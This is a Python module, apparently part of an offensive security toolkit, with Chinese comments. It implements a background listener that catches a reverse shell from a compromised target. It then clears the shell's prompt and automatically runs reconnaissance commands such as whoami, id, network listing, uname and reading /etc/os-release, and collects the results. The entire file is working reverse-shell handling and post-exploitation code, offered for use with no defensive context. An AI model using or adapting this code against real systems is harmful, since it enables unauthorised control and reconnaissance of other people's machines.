import socket
import threading
import time

class OOBListener(threading.Thread):
    """輕量級的背景 Socket 監聽器 (共用工具模組)"""
    def __init__(self, ip, port, timeout=20):
        super().__init__()
        self.ip = ip
        self.port = int(port)
        self.timeout = timeout
        self.success = False
        self.received_data = ""
        
        self.commands_to_execute = [
            "whoami",
            "id",
            "ip -br a 2>/dev/null || ifconfig",
            "uname -a",
            "cat /etc/os-release 2>/dev/null | grep PRETTY_NAME"
        ]

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(self.timeout) 
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.bind((self.ip, self.port))
                s.listen(1)
                print(f"\n[🎧 Listener] 背景已啟動，正在監聽 {self.ip}:{self.port} ...")
                
                conn, addr = s.accept()
                with conn:
                    self.success = True 
                    print(f"\n[⚡ Listener] 成功接獲來自 {addr[0]} 的 Reverse Shell！")
                    
                    conn.settimeout(2.0) 
                    
                    # 1. 清空初始連線的雜訊
                    try:
                        time.sleep(0.5)
                        conn.recv(8192) 
                    except Exception:
                        pass 

                    # 2. 中和 Bash 的互動特性
                    print("[🎧 Listener] 正在中和 Shell 環境雜訊...")
                    conn.sendall(b"export PS1=''\n")
                    conn.sendall(b"export TERM=dumb\n")
                    
                    time.sleep(0.5)
                    try:
                        conn.recv(8192)
                    except Exception:
                        pass

                    delimiter = "---END_OF_CMD_TOKEN---"
                    all_results = []

                    print("[🎧 Listener] 開始逐條自動化派發指令...\n")
                    
                    for cmd in self.commands_to_execute:
                        print(f"  [>] 發送指令: {cmd}")
                        
                        payload = f"{cmd}; echo '{delimiter}'\n"
                        conn.sendall(payload.encode('utf-8'))
                        
                        time.sleep(0.1)
                        
                        output_buffer = ""
                        while True:
                            try:
                                chunk = conn.recv(4096).decode('utf-8', errors='ignore')
                                if not chunk:
                                    break
                                output_buffer += chunk
                                if delimiter in output_buffer:
                                    break
                            except socket.timeout:
                                output_buffer += "\n[!] 接收超時"
                                break
                        
                        # 資料清洗：拔除 Payload 與分隔符號
                        clean_output = output_buffer.replace(payload, "").replace(f"{cmd}; echo '{delimiter}'", "").replace(delimiter, "")
                        clean_output = clean_output.strip()

                        if clean_output:
                            formatted_output = clean_output.replace('\n', '\n      ')
                            print(f"      回顯結果:\n      {formatted_output}\n")
                        else:
                            print("      回顯結果: (無輸出)\n")
                            
                        all_results.append(f"[{cmd}]\n{clean_output}")

                    conn.sendall(b"exit\n")
                    self.received_data = "\n\n".join(all_results)
                    print("[🎧 Listener] 所有指令執行完畢，已安全釋放 Port。")
                    
            except socket.timeout:
                print("\n[🎧 Listener] 等待靶機連線超時，安全關閉監聽器。")
            except Exception as e:
                print(f"\n[!] 監聽器發生嚴重錯誤: {e}")
